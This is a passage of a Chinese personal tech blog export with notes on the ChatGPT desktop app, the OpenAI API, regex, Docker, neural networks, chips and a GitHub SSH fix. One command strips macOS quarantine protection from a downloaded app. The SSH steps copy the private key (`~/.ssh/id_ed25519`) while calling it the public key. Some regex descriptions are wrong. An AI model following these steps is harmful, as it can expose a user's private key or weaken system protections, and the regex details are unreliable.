<p><strong>如果遇到错误 <code>&quot;ChatGPT&quot; is damaged and can&#39;t be opened. You should move it to the Trash</code>. 可能是因为macOS中的安全设置限制。请尝试以下命令</strong></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">sudo xattr -r -d com.apple.quarantine <span class="regexp">/YOUR_PATH/</span>ChatGPT.app</span><br></pre></td></tr></table></figure>
<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><ul>
<li><a href="https://github.com/lencx/ChatGPT/releases/download/v0.12.0/ChatGPT_0.12.0_linux_x86_64.deb">ChatGPT_0.12.0_linux_x86_64.deb</a>: 体积小，但是兼容性差</li>
<li><a href="https://github.com/lencx/ChatGPT/releases/download/v0.12.0/ChatGPT_0.12.0_linux_x86_64.AppImage.tar.gz">ChatGPT_0.12.0_linux_x86_64.AppImage.tar.gz</a>: 工作可靠</li>
</ul>
<h2 id="调用API实用chatgpt"><a href="#调用API实用chatgpt" class="headerlink" title="调用API实用chatgpt"></a>调用API实用chatgpt</h2><p>在<a href="https://platform.openai.com/account/api-keys">Account API Keys - OpenAI API</a>界面中查看api</p>
<p><img src="/2023/03/23/openai/../../../../../blog/source/_posts/docker/image-20230323170956954.png" alt="image-20230323170956954"></p>
<p>然后运行程序</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> openai</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set the API key</span></span><br><span class="line">openai.api_key = <span class="string">&quot;YOUR_API_KEY&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Define the model and prompt</span></span><br><span class="line">model_engine = <span class="string">&quot;text-davinci-003&quot;</span></span><br><span class="line">prompt = <span class="string">&quot;YOUR_QUESTIONS&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Generate a response</span></span><br><span class="line">completion = openai.Completion.create(</span><br><span class="line">    engine=model_engine,</span><br><span class="line">    prompt=prompt,</span><br><span class="line">    max_tokens=<span class="number">1024</span>,</span><br><span class="line">    n=<span class="number">1</span>,</span><br><span class="line">    stop=<span class="literal">None</span>,</span><br><span class="line">    temperature=<span class="number">0.5</span>,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get the response text</span></span><br><span class="line">message = completion.choices[<span class="number">0</span>].text</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(message)</span><br></pre></td></tr></table></figure>
<p>即可实现与chagpt的互动</p>
<h2 id="openai库"><a href="#openai库" class="headerlink" title="openai库"></a>openai库</h2><h3 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h3><p>在<a href="https://pypi.org/project/openai/#files下载最新的openai，`然后运行pip">https://pypi.org/project/openai/#files下载最新的openai，`然后运行pip</a> install &lt;文件名&gt;`</p>
]]></content>
      <categories>
        <category>人工智能</category>
      </categories>
      <tags>
        <tag>chatgpt</tag>
      </tags>
  </entry>
  <entry>
    <title>正则表达式</title>
    <url>/2023/03/08/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h3 id="用于搜索的元字符"><a href="#用于搜索的元字符" class="headerlink" title="用于搜索的元字符"></a>用于搜索的元字符</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">.</th>
<th style="text-align:left">任何单个字符</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">*</td>
<td style="text-align:left">先前模式的零次或多次重复（最长匹配）</td>
</tr>
<tr>
<td style="text-align:left">+</td>
<td style="text-align:left">先前模式的零次或多次重复（最长匹配）</td>
</tr>
<tr>
<td style="text-align:left">?</td>
<td style="text-align:left">0~1次重复前一个模式（最长匹配）</td>
</tr>
<tr>
<td style="text-align:left">～\</td>
<td style="text-align:left">～</td>
<td>\</td>
<td>（~ 或 ~） 的左右任意字符串</td>
</tr>
<tr>
<td style="text-align:left">[～]</td>
<td style="text-align:left">任一个 ~ 字符</td>
</tr>
<tr>
<td style="text-align:left"><sup><a href="#fn_～" id="reffn_～">～</a></sup></td>
<td style="text-align:left">1 个字符不包含在</td>
</tr>
<tr>
<td style="text-align:left">^</td>
<td style="text-align:left">逻辑头</td>
</tr>
<tr>
<td style="text-align:left">$</td>
<td style="text-align:left">逻辑行尾</td>
</tr>
<tr>
<td style="text-align:left">\</td>
<td style="text-align:left">转义 紧随其后的元字符（指定紧随其后的字符不被视为正则表达式符号（元字符））</td>
</tr>
<tr>
<td style="text-align:left">\n</td>
<td style="text-align:left">换行符 <em> CR+LF（控制代码 0x0d+0x0a） 和 LF（控制代码 0x0a） </em> 根据编辑器和设置，CR（控制代码 0x0d）  也匹配。</td>
</tr>
<tr>
<td style="text-align:left">\t</td>
<td style="text-align:left">制表符（控制代码 0x09）</td>
</tr>
<tr>
<td style="text-align:left">\s</td>
<td style="text-align:left">所有空格字符（空格、\t、\n、\r、\f）</td>
</tr>
<tr>
<td style="text-align:left">\S</td>
<td style="text-align:left">除空格（空格、\t、\n、\r、\f）之外的所有空格</td>
</tr>
<tr>
<td style="text-align:left">\x ##</td>
<td style="text-align:left">十六进制 *#は16~0， a~f， A~F</td>
</tr>
<tr>
<td style="text-align:left">\b</td>
<td style="text-align:left">单词分隔符</td>
</tr>
<tr>
<td style="text-align:left">\B</td>
<td style="text-align:left">非单词分隔符</td>
</tr>
<tr>
<td style="text-align:left">\d</td>
<td style="text-align:left">所有半角数字</td>
</tr>
<tr>
<td style="text-align:left">\D</td>
<td style="text-align:left">除半角数字外的所有数字</td>
</tr>
<tr>
<td style="text-align:left">\w</td>
<td style="text-align:left">所有半角字母数字字符和下划线</td>
</tr>
<tr>
<td style="text-align:left">\W</td>
<td style="text-align:left">除字母数字字符和下划线外的所有字符</td>
</tr>
<tr>
<td style="text-align:left">\l</td>
<td style="text-align:left">所有半角小写字母</td>
</tr>
<tr>
<td style="text-align:left">\L</td>
<td style="text-align:left">除半角小写字母外的所有字母（所有大写字母、数字、双角字符等）</td>
</tr>
<tr>
<td style="text-align:left">\u</td>
<td style="text-align:left">所有大写字母</td>
</tr>
<tr>
<td style="text-align:left">\U</td>
<td style="text-align:left">除大写字母（所有小写字母、数字、双角字符等）外的所有字母</td>
</tr>
<tr>
<td style="text-align:left">\一个</td>
<td style="text-align:left">报警（控制代码0x07）</td>
</tr>
<tr>
<td style="text-align:left">\c #</td>
<td style="text-align:left">对应的控制字符 * 只能指定 #はA-Z 的半角字母字符。</td>
</tr>
<tr>
<td style="text-align:left">\e</td>
<td style="text-align:left">转义（控制代码 0x1b）</td>
</tr>
<tr>
<td style="text-align:left">\f</td>
<td style="text-align:left">分页符（控制代码 0x0c）</td>
</tr>
<tr>
<td style="text-align:left">\r</td>
<td style="text-align:left">返回，CR（控制代码0x0d） * 根据编辑器和设置，它与 CR+LF 的 CR 部分不匹配</td>
</tr>
<tr>
<td style="text-align:left">\v</td>
<td style="text-align:left">垂直选项卡（控制代码 0x0b）</td>
</tr>
<tr>
<td style="text-align:left">\Q~\E</td>
<td style="text-align:left">不要将 ~ 部分中包含的元字符解释为元字符 （不需要用 “\” 转义）</td>
</tr>
<tr>
<td style="text-align:left">（？一）</td>
<td style="text-align:left">等同后续大写和小写字母</td>
</tr>
<tr>
<td style="text-align:left">（？-i）</td>
<td style="text-align:left">区分大小写的后续字母</td>
</tr>
<tr>
<td style="text-align:left">(～)</td>
<td style="text-align:left">・图案组 ・在替换字符串中指定要引用的部分（请参阅\1~\9中的部分）</td>
</tr>
<tr>
<td style="text-align:left">(?:～)</td>
<td style="text-align:left">模式组</td>
</tr>
<tr>
<td style="text-align:left">*?</td>
<td style="text-align:left">先前模式的零次或多次重复（最短匹配）</td>
</tr>
<tr>
<td style="text-align:left">+?</td>
<td style="text-align:left">先前模式的零次或多次重复（最短匹配）</td>
</tr>
<tr>
<td style="text-align:left">??</td>
<td style="text-align:left">0~1次重复先前的模式（最短匹配）</td>
</tr>
<tr>
<td style="text-align:left">{最小，最大}</td>
<td style="text-align:left">从前一个模式的最小时间开始重复最大次数（最长匹配）</td>
</tr>
<tr>
<td style="text-align:left">{分钟，}</td>
<td style="text-align:left">重复上一个模式超过一分钟（最长匹配）</td>
</tr>
<tr>
<td style="text-align:left">{数字}</td>
<td style="text-align:left">重复上一个模式两次</td>
</tr>
<tr>
<td style="text-align:left">{最小，最大}？</td>
<td style="text-align:left">从前一个模式的最小时间开始重复最大次数（最短匹配）</td>
</tr>
<tr>
<td style="text-align:left">{分钟，}？</td>
<td style="text-align:left">重复上一个模式超过一分钟的时间（最短匹配）</td>
</tr>
<tr>
<td style="text-align:left">{num}？</td>
<td style="text-align:left">重复上一个模式一次（最短匹配）</td>
</tr>
<tr>
<td style="text-align:left">・・・(?=~)</td>
<td style="text-align:left">仅当尾随字符串为 ~ 时，预读确认组 才匹配。</td>
</tr>
<tr>
<td style="text-align:left">・・・(?! ～)</td>
<td style="text-align:left">仅当尾随字符串不是 ~ 时，预读否定组 才匹配。</td>
</tr>
<tr>
<td style="text-align:left">(?&lt;=~)・</td>
<td style="text-align:left">读后确认组 仅匹配 … 当前面字符串为 ~</td>
</tr>
<tr>
<td style="text-align:left">(?&lt;!~)・</td>
<td style="text-align:left">仅当 前面的字符串不是 ~ …</td>
</tr>
</tbody>
</table>
</div>
<h3 id="替换元字符"><a href="#替换元字符" class="headerlink" title="替换元字符"></a>替换元字符</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">\n</th>
<th>换行符 （CR+LF）</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">\t</td>
<td>制表符（硬制表符）</td>
</tr>
<tr>
<td style="text-align:left">\s</td>
<td>半宽空间</td>
</tr>
<tr>
<td style="text-align:left">\xXX</td>
<td>带有代码 XX 的字符（16 个十六进制数字）</td>
</tr>
<tr>
<td style="text-align:left">\0</td>
<td>找到的整个字符串（0 为零）</td>
</tr>
<tr>
<td style="text-align:left">\n</td>
<td>引用与搜索字符串中指定的第 N 个（和）中包含的模式匹配的字符串（子字符串）。 N 为 1~9。</td>
</tr>
<tr>
<td style="text-align:left">\</td>
<td>转义紧跟在它后面的元字符（指定紧跟在它后面的字符不应被视为正则表达式符号（元字符））</td>
</tr>
</tbody>
</table>
</div>
<p>* 以下是只能与文本编辑器 MIFES 一起使用的元字符。</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">#</th>
<th>一个十进制字符串，表示找到的字符串的逻辑行号</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">$</td>
<td>表示替换字符串数的半角十进制字符串 （$ 是半角字符）</td>
</tr>
<tr>
<td style="text-align:left">\＄</td>
<td>表示替换字符串数的全角十进制字符串 （$ 是全角字符）</td>
</tr>
<tr>
<td style="text-align:left">\@</td>
<td>算术数字序列的一次性输出 初始值和容差值取决于算术数字序列的[初始化]设置。</td>
</tr>
</tbody>
</table>
</div>
]]></content>
  </entry>
  <entry>
    <title>docker</title>
    <url>/2023/02/26/docker/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>容器的集装箱概念是参照了航运中的集装箱概念，在航运中不关心你运输的是汽车还是棉花，它都通过集装箱将运输的流程规范成了标准化的操作，这里容器的使命也是一样，容器具备自包含的能力，将自身程序所依赖的程序全部包含在了容器中，通过Docker将底层环境打平，用户可以将一个容器镜像运行在任何操作系统的宿主机上，也就是Docker所说的“Build once, Run anywhere”。<br><img src="/2023/02/26/docker/image-20230226125114303.png" alt="image-20230226125114303"></p>
<p><strong>容器它的优势有以下几点：</strong></p>
<ol>
<li><p>不再依赖于独立的操作系统运行，相比较虚拟机它没有每个独立的操作系统，突破了宿主机的磁盘IO性能，减少了资源使用的浪费。</p>
</li>
<li><p>容器时应用程序层的抽象，对于运维和开发来说，容器只关心中间件之上的应用，中间件与宿主机的操作系统之间的问题都交给了Docker来处理。</p>
</li>
<li><p>它是自包含程序依赖，这也是它成为云原生应用基石的重要因素</p>
</li>
</ol>
<h2 id="Docker核心概念"><a href="#Docker核心概念" class="headerlink" title="Docker核心概念"></a>Docker核心概念</h2><ol>
<li>镜像</li>
<li>容器</li>
<li>仓库</li>
</ol>
<p><img src="/2023/02/26/docker/image-20230226125320615.png" alt="image-20230226125320615"></p>
<p>Docker的整个运行逻辑如这个图所示，通过Docker Client将需要执行的Docker命令发送给Docker运行的节点上的Docker daemon，Docker daemon将我们的请求进行分解执行，例如我们执行Docker build命令它会根据Dockerfile构建一个镜像存放于本地，执行Docker pull命令会从远端的容器镜像仓库拉取镜像到本地，执行Docker run命令会将容器镜像拉取并运行成为容器实例。</p>
<p>型的linux启动到运行需要2个FS，一个是rootfs，一个是bootfs。bootfs是linux启动时进行加载的，会安装系统所使用的kernel内核，创建完成后bootfs会进行解绑。rootfs是我们真正去使用linux是操作的系统文件系统，包含/dev /bin等目录，对于我们构建容器镜像来说，我们利用rootfs作为我们的基础镜像来使用，一个精简的os来说，它的rootfs可以很小，只需要包括基本的命令和工具即可，例如alpine只有不到10MB。镜像构建基于一个基础镜像将我们需要进行安装的依赖和程序根据Dockerfile编写逐层叠加到镜像中，这里涉及到了一个容器镜像的概念就是，<strong>镜像分层</strong>，镜像的每一层都会有一个独立的id，Docker使用Union FS对Docker镜像进行分层和合层记录，当我们使用同一个基础镜像时，利用Docker镜像分层的功能可以帮助我们使用到已有的镜像层，拉取没有的镜像层，达到镜像的资源共享，减少重复镜像层拉取，达到资源使用最大化。容器运行时会在容器镜像最上层生成一个Container层，这个层是copy这个完整的镜像加载到内存中运行，在这个层级中对于容器来说是可以进行修改的，但是由于运行于内存中，我们对Container层的任何修改都不会对底层镜像生效，当容器消亡时我们修改的数据也一并消亡，这就是容器的<strong>copy on write</strong>特性。</p>
<h2 id="Dockerfile的编写"><a href="#Dockerfile的编写" class="headerlink" title="Dockerfile的编写"></a>Dockerfile的编写</h2><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">```</span><br><span class="line"><span class="keyword">FROM</span> uhub.service.ucloud.cn/hello/maven:<span class="number">3</span>-jdk-<span class="number">8</span>-alpine</span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /usr/src/app</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> target /usr/src/app</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> lib/jmx_prometheus_javaagent-0.12.0.jar /usr/src/app</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> yaml/javaagent.yaml /usr/src/app</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">ENV</span> PORT <span class="number">8080</span></span><br><span class="line"><span class="keyword">EXPOSE</span> $PORT</span><br><span class="line"><span class="keyword">ENV</span> JMXPORT <span class="number">9090</span></span><br><span class="line"><span class="keyword">EXPOSE</span> $JMXPORT</span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [ <span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;java -javaagent:jmx_prometheus_javaagent-0.12.0.jar=<span class="variable">$&#123;JMXPORT&#125;</span>:javaagent.yaml -jar /usr/src/app/demo-0.0.1-SNAPSHOT.jar -Dserver.port=<span class="variable">$&#123;PORT&#125;</span> --spring.config.location=/etc/appconfig/hello.properties&quot;</span> ]</span></span><br><span class="line">```</span><br></pre></td></tr></table></figure>
<p><strong>· FROM</strong> 我们基于什么镜像构建<br><strong>· WORKDIR</strong> 容器的工作目录<br><strong>· RUN</strong> 执行容器构建过程中的命令<br><strong>· CMD &amp; ENTRYPOINT</strong> 执行容器启动后的命令<br><strong>· ADD &amp; COPY</strong> 添加指定的文件到容器镜像中<br><strong>· ENV</strong> 设置环境变量<br><strong>· EXPOSE</strong> 设置容器暴露的端口</p>
]]></content>
  </entry>
  <entry>
    <title>人工智能</title>
    <url>/2023/02/25/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-人工智能基础"><a href="#1-人工智能基础" class="headerlink" title="1 人工智能基础"></a>1 人工智能基础</h1><h2 id="1-1-神经网络"><a href="#1-1-神经网络" class="headerlink" title="1.1 神经网络"></a>1.1 神经网络</h2><p>自提出“人工智能”这一术语开始，科学家们尝试了各种方法来实现它。这些方法包括专家系统，决策树、归纳逻辑、聚类等等，但这些都是假智能。直到人工神经网络技术的出现，才让机器拥有了“真智能”。</p>
<p>为什么说之前的方法都是假智能呢？因为我们人类能清清楚楚地知道它们内部的分析过程，它们只是一个大型的复杂的程序而已；而人工神经网络则不同，它的内部是一个黑盒子，就像我们人类的大脑一样，我们不知道它内部的分析过程，我们不知道它是如何识别出人脸的，也不知道它是如何打败围棋世界冠军的。</p>
<h3 id="人工神经网络构造图"><a href="#人工神经网络构造图" class="headerlink" title="人工神经网络构造图"></a>人工神经网络构造图</h3><p><img src="/2023/02/25/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/image-20230225201700318.png" alt="image-20230225201700318"><br>每个圈代表着一个神经元<br><img src="/2023/02/25/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/image-20230225201743017.png" alt="image-20230225201743017">上面的x是神经元的输入，相当于树突接收的多个外部刺激。w是每个输入对应的权重，它影响着每个输入x的刺激强度。<br>大脑的结构越简单，那么智商就越低。人工神经网络也是一样的，网络越复杂它就越强大，所以我们需要深度神经网络。这里的深度是指层数多，层数越多那么构造的神经网络就越复杂。</p>
<p>训练深度神经网络的过程就叫做深度学习。</p>
<h2 id="1-2-如何将数据输入到神经网络中"><a href="#1-2-如何将数据输入到神经网络中" class="headerlink" title="1.2 如何将数据输入到神经网络中"></a>1.2 如何将数据输入到神经网络中</h2><p>例如待输入的数据是一张图像。为了存储图像，计算机要存储三个独立的矩阵，这三个矩阵分别与此图像的红色、绿色和蓝色相对应。如果图像的大小是64 <em> 64个像素，所以3个64 </em> 64大小的矩阵在计算机中就代表了这张图像，矩阵里面的数值就对应于图像的红绿蓝强度值。</p>
<p>为了更加方便后面的处理，一般把上面那3个矩阵转化成1个向量x。那么这个向量x的总维数就是64 <em> 64 </em> 3，结果是12288。在人工智能领域中，每一个输入到神经网络的数据都被叫做一个特征，那么上面的这张图像中就有12288个特征。这个12288维的向量也被叫做特征向量。神经网络接收这个特征向量x作为输入，并进行预测，然后给出相应的结果。</p>
<p>对于不同的应用，需要识别的对象不同，有些是语音有些是图像有些是传感器数据，但是它们在计算机中都有对应的数字表示形式，通常把它们转化成一个特征向量，然后将其输入到神经网络中。</p>
<h2 id="1-3-神经网络是如何进行预测的"><a href="#1-3-神经网络是如何进行预测的" class="headerlink" title="1.3 神经网络是如何进行预测的"></a>1.3 神经网络是如何进行预测的</h2><h3 id="逻辑回归"><a href="#逻辑回归" class="headerlink" title="逻辑回归"></a>逻辑回归</h3><p>预测的过程基于：$z = dot(w,x)+b$，x代表输入特征向量，比如有三个特性，那么x可以用$(x_1,x_2,x_3)$表示，w表示权重，对应每个输入特征，代表每个特征的重要程度。b表示阈值，用来影响预测结果。z就是预测结果。dot()函数表示将w和x进行向量相乘。</p>
<p>eg：原神出新角色了，你抽不抽取决于戳不辍你xp、有没有足够的资金支持、角色强度机制屌不屌。可以看到一共三个特性，如果你是一个xp党，那么x为(1,0.5,0.5)，w为(10,2,2)，b为-10，得到预测为2&gt;0，所以预测你会抽，如果你是个强度党，w为(2,2,10)，那么预测输出为-2&lt;0,所以预测你不会抽。</p>
<h3 id="激活函数"><a href="#激活函数" class="headerlink" title="激活函数"></a>激活函数</h3><p>在实际的神经网络中，不能直接用逻辑回归。必须要在逻辑回归外面再套上一个函数。这个函数我们就称它为激活函数。激活函数非常非常重要，如果没有它，那么神经网络的智商永远高不起来。</p>
<h4 id="sigmold激活函数"><a href="#sigmold激活函数" class="headerlink" title="sigmold激活函数"></a>sigmold激活函数</h4><script type="math/tex; mode=display">
\delta(z)=\frac{1}{1+e^{-z}}</script><p><img src="/2023/02/25/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/image-20230225204129165.png" alt="image-20230225204129165"></p>
<p>用途——把z映射到[0,1]之间。上图中的横坐标是z，纵坐标我们用y’来表示，y’就代表了最终的预测结果。从图像可以看出，z越大那么y’就越靠近1，z越小那么y’就越靠近0。</p>
<p>使用sigmold激活函数不仅便于神经网络进行计算，也便于我们人类进行理解。例如在预测是否会抽角色的例子中，如果y’是0.8，就说明有80%的概率是你是会抽的。</p>
]]></content>
  </entry>
  <entry>
    <title>芯片</title>
    <url>/2023/02/25/%E8%8A%AF%E7%89%87/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="加法器的组成"><a href="#加法器的组成" class="headerlink" title="加法器的组成"></a>加法器的组成</h2><p>通过与逻辑和异或逻辑即可完成，与逻辑负责进位，异或逻辑负责计算该位的值</p>
<p>如 1 + 1 ，与逻辑看到两个1，所以结果为1；异或逻辑看到两个相同的数，所以结果为0，所以1+1=10</p>
<p>计算更多位数或者减乘除只需要添加更多的运算单元和逻辑就可以实现。</p>
<p>所以现在将数学问题转化为了逻辑问题</p>
<h2 id="逻辑的种类"><a href="#逻辑的种类" class="headerlink" title="逻辑的种类"></a>逻辑的种类</h2><div class="table-container">
<table>
<thead>
<tr>
<th>逻辑名称</th>
<th>输入0,0</th>
<th>输入0,1</th>
<th>输入1,0</th>
<th>输入1,1</th>
</tr>
</thead>
<tbody>
<tr>
<td>与逻辑</td>
<td>0</td>
<td>0</td>
<td>0</td>
<td>1</td>
</tr>
<tr>
<td>或逻辑</td>
<td>0</td>
<td>1</td>
<td>1</td>
<td>1</td>
</tr>
<tr>
<td>非逻辑</td>
<td>1,1</td>
<td>1,0</td>
<td>0,1</td>
<td>0,0</td>
</tr>
<tr>
<td>异或逻辑</td>
<td>0</td>
<td>1</td>
<td>1</td>
<td>0</td>
</tr>
</tbody>
</table>
</div>
<h2 id="继电器"><a href="#继电器" class="headerlink" title="继电器"></a>继电器</h2><p>可以看到逻辑门的实现需要自动开关，通电开关闭合，断电后开关断开，第一代使用的自动开关是继电器</p>
<p><img src="/2023/02/25/%E8%8A%AF%E7%89%87/image-20230225193725240.png" alt="image-20230225193725240"></p>
<h2 id="半导体"><a href="#半导体" class="headerlink" title="半导体"></a>半导体</h2><h3 id="导电性"><a href="#导电性" class="headerlink" title="导电性"></a>导电性</h3><p>原子结构中，从里到外每个电子能级可以容纳$2^n$个电子。</p>
<p>导电性就是电子的流动，原子核对外层电子的束缚比较小所以电子就可以随便跑。<br>绝缘体中每个原子都被牢牢的控制住，因而不导电。例如，硅外层电子是四个，可以和周围4个硅原子组成稳定的8外层电子结构，所以纯净的硅晶体不导电。如果掺点磷，外层五个电子，就会多一个电子无法配对，或者硼，外层3个电子，最终就会少一个电子，因此就会导电。<br><img src="/2023/02/25/%E8%8A%AF%E7%89%87/image-20230225194458393.png" alt="image-20230225194458393"><br><img src="/2023/02/25/%E8%8A%AF%E7%89%87/image-20230225194521772.png" alt="image-20230225194521772"><br><img src="/2023/02/25/%E8%8A%AF%E7%89%87/image-20230225194531603.png" alt="image-20230225194531603"></p>
<h3 id="N型半导体"><a href="#N型半导体" class="headerlink" title="N型半导体"></a>N型半导体</h3><p>也叫施主半导体，有很多多于电子的半导体，比如掺磷的硅晶体</p>
<h3 id="P型半导体"><a href="#P型半导体" class="headerlink" title="P型半导体"></a>P型半导体</h3><p>也叫受主半导体，有很多空穴的半导体，比如掺硼的硅晶体</p>
<h2 id="二极管"><a href="#二极管" class="headerlink" title="二极管"></a>二极管</h2><p><img src="/2023/02/25/%E8%8A%AF%E7%89%87/image-20230225194843923.png" alt="image-20230225194843923"></p>
<p>P型半导体被电子填充，而N型半导体无电子的区域叫做==耗尽区==</p>
<p>如果通上电<br><img src="/2023/02/25/%E8%8A%AF%E7%89%87/image-20230225195101443.png" alt="image-20230225195101443"><br>电子从负极流向正极，就形成了电流<br><img src="/2023/02/25/%E8%8A%AF%E7%89%87/image-20230225195201817.png" alt="image-20230225195201817"><br>电子从负极流向P型半导体，N型半导体中的电子流向正极，而电子无法过PN节从P型半导体流向N型半导体，电子就流动不起来，就没有形成电流。</p>
<h2 id="三极管"><a href="#三极管" class="headerlink" title="三极管"></a>三极管</h2><p><img src="/2023/02/25/%E8%8A%AF%E7%89%87/image-20230225195405165.png" alt="image-20230225195405165"></p>
<p>左侧电子的粒子浓度更高，P型半导体接受不过来，电子会通过PN节传到右边的N型半导体中，因为右侧N型半导体连正极，所以电子就流动起来了。相当于开关闭合<br><img src="/2023/02/25/%E8%8A%AF%E7%89%87/image-20230225195552988.png" alt="image-20230225195552988"></p>
<p><img src="/2023/02/25/%E8%8A%AF%E7%89%87/image-20230225195832235.png" alt="image-20230225195832235"><br>如果A线路有电流，那么B线路也有电流，就是开关闭合<br>如果A线路无电流，那么B线路也无电流，就是开关断开</p>
<h2 id="集成电路"><a href="#集成电路" class="headerlink" title="集成电路"></a>集成电路</h2><p>通过二极管和三极管我们可以看到只是在硅晶体中参杂一些东西在连上几根电线就可以了，所以，直接在一整片硅片上掺元素就可以构成基本的电子元件了。</p>
<p><img src="/2023/02/25/%E8%8A%AF%E7%89%87/image-20230225200052617.png" alt="image-20230225200052617"></p>
<h2 id="芯片"><a href="#芯片" class="headerlink" title="芯片"></a>芯片</h2><p>通过掺杂，在整个硅片上形成很多小的电子元件，通过连接这些电子元件形成各种逻辑门，然后再通过逻辑门组成复杂的运算单元来完成各种二进制的运算。<br><img src="/2023/02/25/%E8%8A%AF%E7%89%87/image-20230225200535739.png" alt="image-20230225200535739"></p>
<p><img src="/2023/02/25/%E8%8A%AF%E7%89%87/image-20230225200430002.png" alt="image-20230225200430002"></p>
]]></content>
      <categories>
        <category>计算机组成</category>
      </categories>
      <tags>
        <tag>芯片</tag>
      </tags>
  </entry>
  <entry>
    <title>github-ssh错误</title>
    <url>/2023/02/25/github-ssh%E9%94%99%E8%AF%AF/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>github中遇到的DNS有关的错误处理</p>
<span id="more"></span>
<p>因为博客是用github作为远程仓库，但是突然遇到一个错误导致一直push不上去，运行到最后会出现kex_exchange_identification: Connection closed by remote host的错误<br><img src="/2023/02/25/github-ssh%E9%94%99%E8%AF%AF/image-20230225165456319.png" alt="image-20230225165456319"><br>在经过很多查询后成功解决，下面为解决过程：</p>
<h3 id="生产新的ssh密钥"><a href="#生产新的ssh密钥" class="headerlink" title="生产新的ssh密钥"></a>生产新的ssh密钥</h3><p>一开始认为是ssh密钥过期了，认为重新生成就好了。</p>
<ol>
<li><p>删除用户文件下.ssh文件中的id开头的文件(如id_rsa,id_ed25519)以及对应的pub文件<br><img src="/2023/02/25/github-ssh%E9%94%99%E8%AF%AF/image-20230225165023785.png" alt="image-20230225165023785"></p>
</li>
<li><p>在git bash命令行下生产新的密钥<code>`ssh-keygen -t ed25519 -C “your_email@example.com”</code>，邮箱就可以不用输入GitHub的登陆密码，</p>
<p>如我这里使用的是ed25519，使用rsa也ok</p>
</li>
<li><p>ssh-agent bash  否则会报错Could not open a connection to your authentication agent.</p>
</li>
<li><p>将生产的密钥放到目标文件中，如<code>ssh-add ~/.ssh/id_ed25519</code>，就会生成如上图的情况</p>
</li>
<li><p>使用<code>clip &lt; ~/.ssh/id_ed25519</code>将SSH公钥复制到剪贴板。不然有可能报错：Key is invalid. You must supply a key in OpenSSH public key format</p>
</li>
<li><p>在个人GitHub主页中settings-SSH and GPG keys中New SSH key中将复制的SSH公钥添加进去</p>
</li>
<li><p>完成后回到git bash命令行进行验证<code>ssh -T git@github.com</code>，出现<br><img src="/2023/02/25/github-ssh%E9%94%99%E8%AF%AF/image-20230225170326096.png" alt="image-20230225170326096"><br>或<code>ssh -Tv git@github.com</code>出现<br><img src="/2023/02/25/github-ssh%E9%94%99%E8%AF%AF/image-20230225170422954.png" alt="image-20230225170422954"><br>说明配置成功。</p>
</li>
</ol>
<h3 id="更换网络连接"><a href="#更换网络连接" class="headerlink" title="更换网络连接"></a>更换网络连接</h3><p>原理没想明白，可能因为本人使用校园网的原因(并且是乱码)，会出现<br><img src="/2023/02/25/github-ssh%E9%94%99%E8%AF%AF/image-20230225184129469.png" alt="image-20230225184129469"><br>但是关闭校园网并且连接wifi(手机流量)时，就可以正常访问<br><img src="/2023/02/25/github-ssh%E9%94%99%E8%AF%AF/image-20230225184218481.png" alt="image-20230225184218481"></p>
